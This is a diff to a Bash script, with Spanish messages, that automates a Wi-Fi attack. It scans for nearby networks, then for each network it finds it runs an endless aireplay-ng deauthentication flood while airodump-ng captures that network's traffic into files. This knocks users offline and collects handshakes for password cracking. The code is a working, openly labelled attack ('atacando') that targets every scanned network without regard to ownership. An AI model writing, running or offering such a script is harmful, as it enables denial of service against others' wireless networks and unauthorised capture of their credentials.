@@ -14,7 +14,7 @@ function wlan0monitor() {
 
 function startadump() {
     echo 'iniciando escaneo'
-    airodump-ng -w coso1 wlan0 > /dev/null & 
+    airodump-ng -w redes/redes wlan0 > /dev/null & 
     airodump_pid=$!
     sleep 10
     kill $airodump_pid    
@@ -23,7 +23,7 @@ function startadump() {
 
 function recuperaredes() {
 
-    lines=$(wc -l 'coso1-01.csv' | awk '{print $1}')
+    lines=$(wc -l 'redes/redes-01.csv' | awk '{print $1}')
     numline=$((lines))
 
     while IFS=',' read -r mac _ _ chan _ cryp _ _ _ _ _ _ _ key
@@ -44,18 +44,45 @@ function recuperaredes() {
             fi
 
             echo "atacando linea $numline contiene MAC: $mac, CHANNEL: $chan, SEGURIDAD: $cryp, NOMBRE: $key"
-            #atacar $mac $chan $key
+            maclist=()
+            chanlist=()
+            cryolist=()
+            keylist=()
+
+            maclist+=($mac)
+            chanlist+=($chan)
+            cryolist+=($cryp)
+            keylist+=($key)
+
+            beacon $mac $chan $key &
+            deauth_pid=$!
+            deauth $mac &
+            beacon_pid=$!
+            wait $beacon_pid
+            wait $deauth_pid
         fi
         numline=$((numline-1))
-    done < coso1-01.csv
+    done < redes/redes-01.csv
 }
 
-function atacar() {
+function beacon() {
     local mac=$1
     local chan=$2
     local key=$3
 
-    sudo airodump-ng -w $key -c $chan --bssid $mac wlan0 > airodump.txt
+    sudo airodump-ng -w caps/$key -c $chan --bssid $mac wlan0 & airodump_pid=$! 
+    sleep 3
+    deauth $mac &
+    deauth_pid=$!
+    wait $deauth_pid
+    #kill $airodump_pid
 }
 
-wlan0monitor
+function deauth(){
+    local mac=$1
+    sudo aireplay-ng --deauth 0 -a $mac wlan0
+    #echo $maclist > deatho.txt
+}
+
+
+recuperaredes
